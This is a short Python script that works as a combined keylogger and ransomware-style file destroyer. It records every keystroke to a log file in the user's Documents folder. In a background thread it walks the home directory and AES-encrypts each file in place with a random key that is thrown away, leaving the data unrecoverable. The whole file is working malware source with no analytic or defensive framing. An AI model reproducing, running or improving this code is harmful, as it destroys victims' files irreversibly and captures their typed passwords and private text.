import os
from pynput import keyboard
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

doNotEncrypt=[r"C:\Windows", r"C:\Program Files", r"C:\Program Files (x86)"]

directory=os.path.join(os.path.expanduser("~"), "Documents", "log.txt")
doNotEncrypt.append(directory)

pressed=set()

def onpress(key):
    global pressed
    letter = str(key).replace("'", "")

    if key in pressed:
        return 

    pressed.add(key)

    if letter=="Key.space":
        letter=" "

    with open(directory, 'a') as file:
        file.write(letter+"\n")

def onrelease(key):
    global pressed
    if key in pressed:
        pressed.remove(key)


def encryptSafe(directory):
    for i in doNotEncrypt:
        if directory.startswith(i):
            return False
    return True


def encrypt():
    root=os.path.expanduser("~")

    for currentdir, sub, filenames in os.walk(root):
        if(not encryptSafe(currentdir)):
           continue
        
        for file in filenames:
            filepath=os.path.join(currentdir,file)
            try:
                key=get_random_bytes(16)
                with open(filepath,'rb') as file:
                    data=file.read()
                
                #CBC Mode stands for Cipher Block Chaining method in AES
                cipher=AES.new(key,AES.MODE_CBC)
                encrypted=cipher.encrypt(pad(data,AES.block_size))

                #iv stands for initialization vector
                with open(filepath, 'wb') as file:
                    file.write(cipher.iv+encrypted)
            except Exception as e:
                continue



threading.Thread(target=encrypt, daemon=True).start()

with keyboard.Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()
